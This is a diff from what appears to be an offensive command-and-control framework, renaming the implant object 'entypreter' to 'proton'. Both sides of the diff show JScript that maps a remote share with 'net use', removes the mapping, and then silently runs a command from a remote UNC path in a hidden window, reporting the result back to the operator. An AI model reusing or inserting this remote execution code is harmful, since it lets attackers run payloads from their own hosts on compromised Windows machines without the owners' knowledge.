@@ -23,21 +23,21 @@ try
 
     // crappy hack to make sure it mounts
 
-    var output = entypreter.shell.exec("net use * " + rpath, "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+    var output = proton.shell.exec("net use * " + rpath, "~DIRECTORY~\\"+proton.uuid()+".txt");
 
     if (output.indexOf("Drive") != -1)
     {
         var drive = output.split(" ")[1];
-        entypreter.shell.run("net use " + drive + " /delete", true);
+        proton.shell.run("net use " + drive + " /delete", true);
     }
 
-    entypreter.WS.Run("%comspec% /q /c " + UNC, 0, true);
+    proton.WS.Run("%comspec% /q /c " + UNC, 0, true);
 
-    entypreter.work.report("Complete");
+    proton.work.report("Complete");
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
